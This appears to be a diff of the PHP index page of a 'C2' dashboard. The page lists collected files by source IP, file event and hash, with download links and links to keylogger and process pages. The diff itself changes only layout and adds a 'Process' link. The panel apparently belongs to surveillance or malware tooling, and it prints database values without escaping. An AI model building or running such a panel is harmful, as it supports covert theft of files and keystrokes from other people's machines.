@@ -9,12 +9,16 @@ include 'db.php';
 <html>
 
 <head>
-<title>.:: <?php echo $title; ?> ::.</title>
-<!-- <link rel="stylesheet" href="main.css"> -->
+<meta http-equiv="refresh" content="60">
 
-<link rel="stylesheet" href="./css/bootstrap.min.css">
-<script src="jquery.js"></script>
-<script src="./js/bootstrap.min.js"></script>
+
+<?php
+include 'header.php';
+?>
+
+
+
+
 
 </head>
 
@@ -27,10 +31,13 @@ include 'db.php';
 			if (r == true) {  
 				location.href="index.php?do=D";  
 			}   
-		}  
+		} 
+	
 </script>
-
+<br>
+<div class="container-fluid">
 <table class="table table-bordered table-hover">
+
 <thead>
 <tr>
 	<td colspan="7" align="center"><h3>C2</h3></td>
@@ -80,7 +87,7 @@ if ($result->num_rows > 0) {
 	$file_name =  $row["file_name"];
 	$hash = $row["hash"];
 	
-	echo "<tr><td>" . $row["ip_address_source"] . "</td><td>" . $row["timestamp"] . "</td><td>" . $row["id_log"] . "</td><td>" . $file_name . "</td><td><a target='_blank' href='https://www.virustotal.com/gui/search/" . $hash . "'>" . $hash . "</a></td><td align='center'><a target='_blank' href='open.php?id=" . $row["id"] . "'>Apri</a></td></tr>";
+	echo "<tr><td>" . $row["ip_address_source"] . "</td><td>" . $row["timestamp"] . "</td><td>" . $row["id_log"] . "</td><td>" . $file_name . "</td><td><a target='_blank' href='https://www.virustotal.com/gui/search/" . $hash . "'>" . $hash . "</a></td><td align='center'><a target='_blank' href='open.php?id=" . $row["id"] . "'>Download</a></td></tr>";
   }
 } 
 
@@ -93,12 +100,16 @@ if ($result->num_rows > 0) {
 	<td colspan="7">ID Log 169 -> Create | 269 -> Rename | 369 -> Modify</td>
 </tr>
 <tr>
-	<td colspan="7">Record number: <?php echo $result->num_rows; ?>&nbsp;|&nbsp;<a href="index.php">Update</a>&nbsp;|&nbsp;<a href="javascript:myconf();">Delete All</a>&nbsp;|&nbsp;<a href="key.php">Keylogger</a></td>
+	<td colspan="7">Record number: <?php echo $result->num_rows; ?>&nbsp;|&nbsp;<a href="index.php">Update</a>&nbsp;|&nbsp;<a href="javascript:myconf();">Delete All</a>&nbsp;|&nbsp;<a href="key.php">Keylogger</a>&nbsp;|&nbsp;<a href="process.php">Process</a></td>
 </tr>
 
 
 </tbody>
 </table>
+
+  
+</div>
+
 
 </body>
 </html>
